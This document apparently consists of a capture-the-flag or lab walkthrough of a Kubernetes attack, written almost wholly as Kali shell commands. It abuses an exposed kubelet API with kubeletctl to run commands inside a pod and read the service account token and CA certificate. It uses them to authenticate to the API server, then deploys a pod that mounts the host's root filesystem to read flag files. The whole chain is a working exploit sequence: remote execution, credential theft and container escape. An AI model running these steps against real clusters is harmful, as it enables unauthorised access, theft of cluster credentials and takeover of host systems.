```bash - kali
curl https://$TARGET:10250/pods -k
```

```bash - kali
git clone https://github.com/cyberark/kubeletctl
```

```bash - kali
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
```

```bash - kali
chmod a+x ./kubeletctl_linux_amd64  
```

```bash - kali
sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

```bash - kali
kubeletctl --server $TARGET pods
```

```bash - kali
kubeletctl --server $TARGET scan rce
```

```bash - kali
kubeletctl --server $TARGET exec "id" -p nginx -c nginx
```

```bash - kali
kubeletctl --server $TARGET exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx  
```

```bash - kali
kubeletctl --server $TARGET exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```

```bash - kali
export token="eyJhbGciOiJSUzI1Ni....."
```

Save the ca.crt output to a file named "ca.crt"

```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 get pods
```

```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 auth can-i --list
```

---

f.yaml

```yaml - kali
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

---

```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 apply -f f.yaml  
```

```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 get pods
```

```bash - kali
kubeletctl --server $TARGET exec "cat /root/home/user/user.txt" -p nginxt -c nginxt  
```

```bash - kali
kubeletctl --server $TARGET exec "cat /root/root/root.txt" -p nginxt -c nginxt
```